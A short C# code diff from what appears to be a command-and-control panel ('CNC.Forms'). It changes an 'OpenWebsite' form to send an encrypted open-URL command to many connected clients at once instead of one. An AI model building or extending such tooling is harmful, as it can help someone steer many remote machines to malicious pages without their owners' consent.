@@ -14,16 +14,19 @@ namespace CNC.Forms
 {
     public partial class OpenWebsite : Form
     {
-        private Client currentClient;
-        public OpenWebsite(Client client)
+        private Client[] currentClients;
+        public OpenWebsite(Client[] clients)
         {
-            currentClient = client;
+            currentClients = clients;
             InitializeComponent();
         }
 
         private void btnExecute_Click(object sender, EventArgs e)
         {
-            currentClient.Connection.SendObject<string>("OpenWebsiteReq", Cryptography.Encrypt(txtUrl.Text));
+            for (int i = 0; i < currentClients.Length; i++)
+            {
+                currentClients[i].Connection.SendObject<string>("OpenWebsiteReq", Cryptography.Encrypt(txtUrl.Text));
+            }
         }
     }
 }
